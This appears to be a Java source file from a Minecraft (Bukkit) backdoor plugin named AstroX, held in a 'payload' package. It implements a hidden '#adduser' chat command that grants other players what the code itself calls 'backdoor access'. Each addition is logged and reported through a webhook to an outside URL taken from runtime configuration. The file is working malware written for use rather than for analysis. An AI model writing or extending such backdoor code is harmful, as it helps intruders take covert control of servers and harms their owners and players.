package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.payload.AuthManager;
import dev.naruto.astrox.utils.DebugLogger;
import dev.naruto.astrox.utils.WebhookNotifier;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.UUID;

public class AddUserCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length == 0) {
            sender.sendMessage("§cUsage: #adduser <uuid|playername>");
            sender.sendMessage("§7Example: #adduser 069a79f4-44e9-4726-a5be-fca90e38aaf5");
            sender.sendMessage("§7Example: #adduser Notch");
            return;
        }

        AuthManager authManager = AuthManager.getInstance();
        if (authManager == null) {
            sender.sendMessage("§c✗ Auth system error");
            return;
        }

        String input = args[0];
        UUID targetUUID;
        String targetName;

        // Try to parse as UUID first
        try {
            targetUUID = UUID.fromString(input);
            Player onlinePlayer = Bukkit.getPlayer(targetUUID);
            targetName = onlinePlayer != null ? onlinePlayer.getName() : "Offline Player";
        } catch (IllegalArgumentException e) {
            // Not a UUID, treat as player name
            Player targetPlayer = Bukkit.getPlayer(input);

            if (targetPlayer == null) {
                sender.sendMessage("§c✗ Player not found. Use UUID for offline players.");
                return;
            }

            targetUUID = targetPlayer.getUniqueId();
            targetName = targetPlayer.getName();
        }

        // Check if already authorized
        if (authManager.isAuthorized(targetUUID)) {
            sender.sendMessage("§e⚠ §f" + targetName + " §7is already authorized");
            return;
        }

        // Authorize the user
        authManager.authorize(targetUUID, "added_by_" + sender.getName());

        // Success message
        sender.sendMessage("§8§m━━━━━━━━━━━━━━━━━━━━━━");
        sender.sendMessage("§a✓ User Added Successfully");
        sender.sendMessage("§7Player: §f" + targetName);
        sender.sendMessage("§7UUID: §f" + targetUUID);
        sender.sendMessage("§7Added by: §f" + sender.getName());
        sender.sendMessage("§8§m━━━━━━━━━━━━━━━━━━━━━━");

        // Notify the target player if online
        Player targetPlayer = Bukkit.getPlayer(targetUUID);
        if (targetPlayer != null && targetPlayer.isOnline()) {
            targetPlayer.sendMessage("§8§m━━━━━━━━━━━━━━━━━━━━━━");
            targetPlayer.sendMessage("§a§l[AstroX] Access Granted");
            targetPlayer.sendMessage("§7You have been granted backdoor access");
            targetPlayer.sendMessage("§7Type §e#help §7to see available commands");
            targetPlayer.sendMessage("§8§m━━━━━━━━━━━━━━━━━━━━━━");
        }

        // Log the event
        DebugLogger.log("User added: " + targetName + " (" + targetUUID + ") by " + sender.getName());

        // Send webhook notification
        sendWebhookNotification(sender.getName(), targetName, targetUUID.toString());
    }

    /**
     * Send webhook notification about new user
     */
    private void sendWebhookNotification(String addedBy, String targetName, String targetUUID) {
        if (RuntimeConfig.webhookUrl == null) return;

        Bukkit.getScheduler().runTaskAsynchronously(
                Bukkit.getPluginManager().getPlugins()[0],
                () -> {
                    try {
                        WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
                        notifier.sendUserAddedNotification(addedBy, targetName, targetUUID);
                    } catch (Exception e) {
                        DebugLogger.error("Failed to send user-added webhook", e);
                    }
                }
        );
    }

    @Override
    public String getDescription() {
        return "Grant access to additional users";
    }

    @Override
    public String getUsage() {
        return "<uuid|playername>";
    }

    @Override
    public String getCategory() {
        return "Access Control";
    }
}
